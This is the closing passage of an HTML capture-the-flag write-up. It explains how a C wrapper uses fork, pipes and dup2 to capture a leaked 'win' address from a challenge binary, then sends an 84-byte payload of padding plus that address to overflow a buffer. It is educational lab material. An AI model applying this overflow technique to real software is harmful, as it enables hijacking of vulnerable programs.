+<h3>write()</h3>
+
+<pre>
+write(dd[1], test_buf, sizeof(test_buf));
+</pre>
+
+<p>
+Sends the 84-byte payload to the challenge's stdin.
+</p>
+
+<h3>close()</h3>
+
+<pre>
+close(dd[1]);
+</pre>
+
+<p>
+Closes the pipe descriptor after communication is finished.
+</p>
+
+<h3>wait()</h3>
+
+<pre>
+wait(NULL);
+</pre>
+
+<p>
+Waits for the child process to finish.
+</p>
+
+<hr>
+
+<h2>29. Important Difference Between read() and a C String</h2>
+
+<p>
+One thing that became clear during this challenge is that Linux
+<b>read()</b> operates on bytes, not C strings.
+</p>
+
+<p>
+For example:
+</p>
+
+<pre>
+ssize_t n = read(
+    fd[0],
+    buffer,
+    sizeof(buffer) - 1
+);
+</pre>
+
+<p>
+After this operation, there is no automatic:
+</p>
+
+<pre>
+'\0'
+</pre>
+
+<p>
+Therefore I explicitly use:
+</p>
+
+<pre>
+buffer[n] = '\0';
+</pre>
+
+<p>
+Only after doing this can the buffer safely be used with functions
+such as:
+</p>
+
+<pre>
+printf("%s", buffer);
+</pre>
+
+<p>
+This distinction is important when working with pipes and binary
+payloads.
+</p>
+
+<hr>
+
+<h2>30. Why the Payload Uses unsigned char</h2>
+
+<p>
+The payload is declared as:
+</p>
+
+<pre>
+unsigned char test_buf[84];
+</pre>
+
+<p>
+This is useful because the payload is fundamentally a collection of
+bytes.
+</p>
+
+<p>
+It is not necessarily a normal C string.
+</p>
+
+<p>
+For example, the address can contain bytes that are not printable
+characters.
+</p>
+
+<p>
+Therefore:
+</p>
+
+<pre>
+unsigned char
+</pre>
+
+<p>
+is a better representation for raw byte data than treating the entire
+payload as a normal string.
+</p>
+
+<hr>
+
+<h2>31. Why sizeof(test_buf) Is Used</h2>
+
+<p>
+The final write operation is:
+</p>
+
+<pre>
+write(
+    dd[1],
+    test_buf,
+    sizeof(test_buf)
+);
+</pre>
+
+<p>
+The buffer was declared as:
+</p>
+
+<pre>
+unsigned char test_buf[84];
+</pre>
+
+<p>
+Therefore:
+</p>
+
+<pre>
+sizeof(test_buf)
+        |
+        v
+       84
+</pre>
+
+<p>
+This sends all 84 bytes.
+</p>
+
+<p>
+This is different from:
+</p>
+
+<pre>
+write(dd[1], buffer, n);
+</pre>
+
+<p>
+because <b>n</b> represents the number of bytes returned by the
+previous <b>read()</b>.
+</p>
+
+<p>
+It does not represent the size of the new payload.
+</p>
+
+<hr>
+
+<h2>32. The Complete Exploitation Concept</h2>
+
+<p>
+The important concept behind the challenge is that the input is not
+just a string.
+</p>
+
+<p>
+It is a carefully structured sequence of bytes:
+</p>
+
+<pre>
+input
+ |
+ +-- 80 bytes
+ |      |
+ |      +-- padding
+ |
+ +-- 4 bytes
+        |
+        +-- target address
+</pre>
+
+<p>
+The leaked address allows the wrapper to construct the second part of
+the payload dynamically.
+</p>
+
+<p>
+The complete process is:
+</p>
+
+<pre>
+[LEAK] win: 0x6298930d
+            |
+            v
+       extract string
+            |
+            v
+       "0x6298930d"
+            |
+            v
+         strtoul()
+            |
+            v
+       0x6298930d
+            |
+            v
+       raw 4 bytes
+            |
+            v
+     +--------------+
+     | 80 x 'A'     |
+     | 4-byte addr  |
+     +--------------+
+            |
+            v
+        84 bytes
+            |
+            v
+          write()
+            |
+            v
+       challenge stdin
+</pre>
+
+<hr>
+
+<h2>33. Final Execution Flow</h2>
+
+<p>
+The complete solution can be summarized in one diagram:
+</p>
+
+<pre>
+                    START
+                      |
+                      v
+                  pipe(fd)
+                      |
+                      v
+                  pipe(dd)
+                      |
+                      v
+                    fork()
+                      |
+          +-----------+-----------+
+          |                       |
+          v                       v
+        CHILD                   PARENT
+          |                       |
+          |                       |
+      dup2(fd[1],1)          close(fd[1])
+          |                       |
+      dup2(dd[0],0)          close(dd[0])
+          |                       |
+          |                     read()
+          |                       |
+        exec()                    v
+          |                  leaked address
+          v                       |
+   remember-this                  v
+          |                   parse leak
+          |                       |
+          |                       v
+          |                  strtoul()
+          |                       |
+          |                       v
+          |                  build payload
+          |                       |
+          |                       v
+          |                    write()
+          |                       |
+          +-----------------------+
+                                  |
+                                  v
+                            challenge stdin
+                                  |
+                                  v
+                             final output
+                                  |
+                                  v
+                                wait()
+                                  |
+                                  v
+                                 END
+</pre>
+
+<hr>
+
+<h2>34. Conclusion</h2>
+
+<p>
+The main lesson from this challenge was that the buffer overflow itself
+was only one part of the problem.
+</p>
+
+<p>
+The interesting part was building the complete communication mechanism
+around the challenge.
+</p>
+
+<p>
+The final solution combines process creation, file descriptors,
+pipes, stdin/stdout redirection, runtime leak parsing, integer
+conversion, byte-level buffer construction, and process
+synchronization.
+</p>
+
+<p>
+The complete chain is:
+</p>
+
+<pre>
+challenge
+    |
+    v
+leak address
+    |
+    v
+pipe
+    |
+    v
+parent
+    |
+    v
+parse
+    |
+    v
+strtoul()
+    |
+    v
+numeric address
+    |
+    v
+80-byte padding
+    +
+4-byte address
+    |
+    v
+84-byte payload
+    |
+    v
+write()
+    |
+    v
+challenge stdin
+    |
+    v
+buffer overflow
+    |
+    v
+target function
+</pre>
+
+<p>
+What initially looked like several separate Linux concepts turned out
+to be one connected workflow.
+</p>
+
+<p>
+The pipes provide communication, <b>fork()</b> creates the two
+processes, <b>dup2()</b> connects the pipes to stdin and stdout,
+<b>execvp()</b> starts the challenge, <b>read()</b> retrieves the leak,
+<b>strtoul()</b> converts the address, <b>memset()</b> and
+<b>memcpy()</b> construct the payload, and <b>write()</b> sends the
+final bytes back to the challenge.
+</p>
+
+<blockquote>
+The important part was not simply creating an overflow payload. The
+real exercise was understanding how a parent process can dynamically
+communicate with another process, obtain runtime information, transform
+that information into raw bytes, and feed the resulting binary data
+back into the program.
+</blockquote>
+
+<hr>
+
+<center>
+
+<h3>--- END OF WRITE-UP ---</h3>
+
+<p>
+<a href="index.html">[ Back to Home ]</a>
+</p>
+
+</center>
+
+</body>
+
+</html>
